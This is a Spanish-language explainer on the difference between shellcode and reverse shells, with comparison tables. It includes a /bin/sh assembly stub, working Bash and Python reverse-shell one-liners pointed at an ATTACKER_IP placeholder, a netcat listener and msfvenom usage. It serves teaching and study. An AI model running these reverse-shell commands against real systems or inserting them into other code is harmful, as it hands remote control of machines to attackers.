
# Ataques del lado del cliente

| Concepto                          | ¿Qué es?                                                                                                                                                                                                                               | Finalidad principal                                                                                                                    | ¿Cómo se usa en un exploit?                                                                                                                                                              |
| --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Shellcode**                     | **Fragmento de _código máquina_** (normalmente en forma de bytes `\x90\x90…`) que se inyecta y se **ejecuta dentro del proceso víctima** cuando logramos desviar el flujo de control (p. ej. desbordamiento de búfer, ROP, FFI, etc.). | Ejecutar cualquier acción que el atacante programe: abrir un shell, descargar otro binario, cambiar permisos, in-memory patching, etc. | El exploit copia esos bytes a la memoria del proceso, apunta el _Instruction Pointer_ allí y deja que la CPU los ejecute.                                                                |
| **Shell inverso (reverse shell)** | **Tipo de sesión interactiva** en la que el host comprometido **abre una conexión saliente** (TCP/UDP/HTTP, etc.) **hacia el atacante** y redirige la entrada/salida de un intérprete de comandos.                                     | Sortear firewalls/NAT: el puerto se abre “desde dentro”, normalmente permitido; facilita el control remoto interactivo.                | El shell inverso se consigue **con algún payload (ej.: shellcode, un binario, una macro, etc.)** que ejecute `connect(attacker_ip,attacker_port); dup2(sock,0/1/2); execve("/bin/sh");`. |

> **En resumen:**  
> _Shellcode_ es **código**; un _reverse shell_ es **el canal interactivo** que se crea (y que puede estar implementado con shellcode).

---

### 1. Shellcode con más detalle

- **Formato**: secuencia de bytes en ensamblador puro, optimizada para ser pequeña y libre de bytes nulos (`\x00`) u otros caracteres problemáticos.
    
    ```asm
    ; ejemplo simplificado para Linux/x86
    xor   eax,eax        ; eax = 0  (syscall execve)
    push  eax
    push  0x68732f2f     ; “//sh”
    push  0x6e69622f     ; “/bin”
    mov   ebx,esp        ; puntero a "/bin//sh"
    mov   edx,eax        ; NULL
    mov   ecx,edx        ; NULL
    mov   al,0xb         ; syscall número 11 (execve)
    int   0x80
    ```
    
- **Uso típico**: se coloca como _payload_ en exploits de memoria (buffer overflow, format-string, use-after-free, etc.) o se inyecta mediante técnicas como DLL hijacking, shellcode staging, macros maliciosas, etc.
    
- **Variedades**:
    
    - _execve("/bin/sh")_ (shell local)
        
    - _bind shell_ (abre un puerto y espera)
        
    - _reverse shell_ (conecta al atacante)
        
    - _download & execute_, _migrate_, _add-user_, _meterpreter stager_, etc.
        

### 2. Reverse shell con más detalle

1. **Fase 1 – Conexión saliente**
    
    - El host víctima ejecuta algo equivalente a:
        
        ```c
        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, {attacker_ip, 4444});
        ```
        
2. **Fase 2 – Redirección de I/O**
    
    - Duplica el descriptor de socket a STDIN, STDOUT y STDERR:
        
        ```c
        dup2(s, 0); dup2(s, 1); dup2(s, 2);
        ```
        
3. **Fase 3 – Invocar el intérprete**
    
    - `execve("/bin/bash", NULL, NULL);` (Linux) o `cmd.exe` (Windows).
        

> **El resultado:** el atacante escucha (`nc -lvnp 4444`) y recibe un prompt remoto pero dentro de la misma sesión TCP creada por la víctima.

---

### 3. Cómo se relacionan en la práctica

- **Metasploit**
    
    - Exploit ⇒ selecciona `payload/windows/x64/shell_reverse_tcp`
        
    - Ese payload incluye el shellcode que implementa el reverse shell.
        
- **Manual / scripting**
    
    - Puedes empaquetar el reverse shell dentro de un macro VBA, un JS en XSS, o en un binario dropper: el mecanismo no cambia.
        
- **Post-explotación**
    
    - Tras obtener una shell inversa inicial, a menudo se migra a `meterpreter`, se eleva privilegios, o se pivotan nuevas redes.
        

---

### 4. ¿Por qué preferir un reverse shell sobre un bind shell?

|Escenario|Reverse shell|Bind shell|
|---|---|---|
|**Firewall outbound ≤ 80/443**|✅ Posible (puerto saliente permitido)|❌ Bloqueado (requiere abrir puerto entrante)|
|**NAT / CGNAT**|✅ La víctima crea la conexión, NAT hace _hair-pin_|❌ El atacante no puede enrutar hasta la IP privada|
|**Detección**|Menos obvio si usa HTTPS/TLS|Fácil de escanear con Nmap|

---

### 5. Ejemplos rápidos

- **Bash one-liner (reverse shell)**
    
    ```sh
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    ```
    
- **Python reverse shell**
    
    ```python
    import socket,os,pty
    s=socket.socket(); s.connect(("ATTACKER_IP",4444))
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
    ```
    
- **C shellcode stub (Windows/x64, reverse TCP)** – generado con `msfvenom -p windows/x64/shell_reverse_tcp LHOST=… LPORT=… -f c`.
    

---

### 6. Idea final

- **Shellcode** ≈ “_qué instrucciones ejecutaremos_”
    
- **Reverse shell** ≈ “_el canal de comunicación interactiva que esas instrucciones construyen_”.
    

En la práctica, **un reverse shell suele ir empaquetado _dentro_ de un fragmento de shellcode**, pero también puede venir como binario, script o módulo de framework.